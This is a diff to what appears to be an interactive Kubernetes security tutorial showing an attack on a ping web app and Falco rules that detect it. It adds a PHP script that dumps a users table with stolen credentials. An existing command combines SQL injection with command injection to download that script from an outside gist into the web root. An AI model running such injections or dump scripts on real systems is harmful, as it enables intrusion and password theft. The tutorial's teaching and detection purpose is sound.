@@ -1,5 +1,22 @@
 Once the attacker knows the login details for the database, he could easily write a [small rogue program](https://gist.githubusercontent.com/quique/4630ca1bbd9e7c7d44337d7f132aac8b/raw/00d94164db24b9e53007bee419af0201019f63fe/dump.php), and place it in our server:
 
+<!-- gist raw content, in case it is deleted from the original source!!
+
+<?php
+// Connect using the stolen credentials
+$link = mysqli_connect("mysql", "root", "foobar", "employees");
+
+// Get all the data from the users table
+$re = mysqli_query($link, "SELECT * FROM users");
+
+// Show the data
+echo "<pre>";
+while ($row = mysqli_fetch_assoc($re)) {
+    var_dump($row);
+}
+echo "</pre>";
+ -->
+ 
 `kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; curl https://gist.githubusercontent.com/quique/4630ca1bbd9e7c7d44337d7f132aac8b/raw/00d94164db24b9e53007bee419af0201019f63fe/dump.php > /var/www/html/dump.php " -X POST http://ping/ping.php`{{execute}}
 
 Finally, he could invoke his program to get a dump of the database contents, including the table with all our users and their passwords.
@@ -14,14 +31,14 @@ Falco help us detect this kind of attacks thanks to these custom rules:
 ```yaml
 - rule: Apache writing to non allowed directory
   desc: Attempt to write to directories that should be immutable
-  condition: open_write and container and k8s.ns.name=ping and k8s.deployment.name=ping and not (ping_allowed_dirs and proc.name in (apache2))
+  condition: open_write and container and k8s.ns.name=ping and not (ping_allowed_dirs and proc.name in (apache2))
   output: "Writing to forbidden directory (user=%user.name command=%proc.cmdline file=%fd.name)"
   priority: ERROR
   tags: [filesystem]
 
 - rule: Forbidden network outbound connection
   desc: A non-whitelisted process is trying to reach the Internet
-  condition: outbound and container and k8s.ns.name=ping and k8s.deployment.name=ping and not proc.name in (ping, apache2)
+  condition: outbound and container and k8s.ns.name=ping and not proc.name in (ping, apache2)
   output: Forbidden outbound connection (user=%user.name command=%proc.cmdline connection=%fd.name)
   priority: ERROR
   tags: [network]
